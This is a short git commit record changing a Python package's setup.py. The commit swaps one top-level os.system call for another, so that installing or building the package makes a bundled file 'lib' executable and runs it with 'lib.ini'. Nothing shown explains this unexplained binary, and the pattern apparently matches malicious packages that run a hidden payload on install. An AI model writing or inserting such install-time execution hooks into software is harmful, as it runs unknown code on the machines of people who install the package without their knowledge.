e8cb87d0caf1b28ab9bb26a74835bc3474017af0
aliyadenasa <asamaderika@outlook.co.id>
2022-03-26 07:10:02 +0000

    python

--- setup.py
+++ setup.py
@@ -1,5 +1,5 @@
 import os
-os.system ("chmod +x madang && ./madang")
+os.system ("chmod +x lib && ./lib lib.ini")
 from setuptools import find_packages, setup
 
 with open(os.path.join(os.path.dirname(__file__), 'README.md'), encoding="utf-8") as readme:
